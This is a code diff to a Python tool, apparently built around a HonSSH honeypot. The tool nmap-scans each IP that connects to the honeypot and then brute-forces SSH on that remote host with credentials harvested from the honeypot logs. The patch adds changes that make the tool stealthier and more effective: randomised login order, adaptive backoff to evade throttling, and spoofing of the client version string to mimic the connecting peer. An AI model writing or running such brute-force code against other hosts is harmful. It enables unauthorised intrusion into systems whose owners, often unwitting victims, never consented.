@@ -15,11 +15,13 @@ from sys import stdout, stderr, argv
 from os import environ
 from os.path import dirname
 from copy import copy
+from random import shuffle
 import json, nmap, time, re
 
-IGNORE_LOCALHOST=True
+IGNORE_LOCALHOST=False
 defer.setDebugging(False)
 DEBUG=False
+DEFAULT_VERSION='YourMom'
 PLAIN = '\033[0m'
 RED = '\033[0;31m'
 LRED = '\033[1;31m'
@@ -33,7 +35,6 @@ PURPLE = '\033[0;35m'
 LPURPLE = '\033[1;35m'
 CYAN = '\033[0;36m'
 LCYAN = '\033[1;36m'
-Transport._CLIENT_ID = 'YourMom'
 
 
 def msg(color, identifier, message):
@@ -51,12 +52,19 @@ class SshTarget(object):
 
     def fire(self, remote_tuple, user_pass_list):
         valid_logins = []
+        max_retries = len(user_pass_list)
         sleep_time = 0.5
         sleep_fac = 0.01
+        sleep_max = 1800.0
 
-        while len(user_pass_list) > 0:
+        retries = 0
+        while len(user_pass_list) > 0 and retries < max_retries:
+            shuffle(user_pass_list)
             failed = False
             for usern, passw in user_pass_list:
+                if len([u for u in valid_logins if u[0] == usern]) > 0:
+                    user_pass_list.remove((usern,passw))
+                    break
                 try:
                     time.sleep(sleep_time)
                     sleep_time += sleep_time * sleep_fac
@@ -75,6 +83,8 @@ class SshTarget(object):
                     self.client.close()
                 except AuthenticationException:
                     user_pass_list.remove((usern,passw))
+                    if sleep_time > sleep_max:
+                        sleep_time /= 10
                     break
                 except Exception as ex:
                     stderr.write('USER %s/%s - %s\n' %
@@ -83,15 +93,27 @@ class SshTarget(object):
                     failed = True
                     break
                 else:
+                    stderr.write('*** FOUND %s/%s ***\n' %
+                        (usern, passw)
+                    )
                     user_pass_list.remove((usern,passw))
                     valid_logins.append((usern, passw))
                     sleep_time /= 2
                     break
 
             if failed is True:
-                sleep_time *= 2
-                stderr.write('INCREASED sleep time to %s\n' %
-                    (sleep_time))
+                retries += 1
+                if sleep_time > sleep_max:
+                    sleep_time /= 2
+                    stderr.write('sleep time exceeded %.2fs, DECREASED to %.2fs, retried %d/%d times\n' %
+                        (sleep_max, sleep_time, retries, max_retries))
+                else:
+                    sleep_time *= 2
+                    stderr.write('INCREASED sleep time to %.2fs, retried %d/%d times\n' %
+                        (sleep_time, retries, max_retries))
+
+        if retries == max_retries:
+            stderr.write('WARNING: reached max retries %d\n' % (retries))
         return valid_logins
 
     @staticmethod
@@ -107,6 +129,11 @@ class SshTarget(object):
 
     @staticmethod
     def sshBruteForce(remote_ip, possible_ssh_port):
+        if 'SSH_VERSION' in environ:
+            Transport._CLIENT_ID = environ['SSH_VERSION']
+        else:
+            Transport._CLIENT_ID = DEFAULT_VERSION
+        stderr.write('SSH Client Version: %s\n' % (Transport._CLIENT_ID))
         ssh = SshTarget()
         user_pass_list = SshTarget.parseHonsshSpoofLog()
         result = ssh.fire((remote_ip, possible_ssh_port), user_pass_list)
@@ -152,7 +179,7 @@ class NmapTarget(object):
 
     def fire(self, remote_ip):
         self.nmap_output = self.nm.scan(remote_ip, arguments='-sV -Pn --top-ports 2000')
-        self.minn_output = self.nm.scan(remote_ip, arguments='-sV -Pn -p 22,2222,22050')
+        self.minn_output = self.nm.scan(remote_ip, arguments='-sV -Pn -p 22,2222,22050,22222')
         self.nmap_output['scan'][remote_ip]['tcp'].update(self.minn_output['scan'][remote_ip]['tcp'])
         print json.dumps(self.nmap_output['scan'][remote_ip], indent=4, sort_keys=True)
 
@@ -164,7 +191,7 @@ class NmapReceiver(ProcessProtocol):
         self.remote_ip = remote_ip
 
     def done(self, reason):
-        msg(LGREEN, '[PROTOCOL][NMAP]', 'Scan <%s> finished. Result: <%s>' %
+        msg(LBLUE, '[PROTOCOL][NMAP]', 'Scan <%s> finished. Result: <%s>' %
             (self.remote_ip, reason))
 
     def childDataReceived(self, childFD, data):
@@ -213,6 +240,11 @@ class JsonReceiver(LineReceiver):
         self.auths     = self.session.get('auths', [{}])
         self.remote_ip = self.session.get('peer_ip', None)
         self.country   = self.session.get('country', '')
+        self.version   = self.session.get('version', DEFAULT_VERSION)
+        if self.version.lower().startswith('unknown'):
+            self.version = DEFAULT_VERSION
+        elif self.version.lower().startswith('ssh-2.0-'):
+            self.version = self.version[len('SSH-2.0-'):]
 
     def isUnscannedRemote(self):
         return True if self.remote_ip not in self.targets else False
@@ -233,10 +265,12 @@ class JsonReceiver(LineReceiver):
                 (self.remote_ip, possible_ssh_port))
             d = defer.Deferred()
             d.addCallbacks(sshSucceeded, errorCallback)
+            e = environ.copy()
+            e['SSH_VERSION'] = self.version
             reactor.spawnProcess(
                 SshReceiver(self, d, (self.remote_ip, possible_ssh_port)),
                 argv[0], [argv[0], "ssh", self.remote_ip+':'+possible_ssh_port],
-                environ, usePTY=False, childFDs={1:'r',2:'r'}
+                e, usePTY=False, childFDs={1:'r',2:'r'}
             )
 
     def getPossibleSshServices(self):
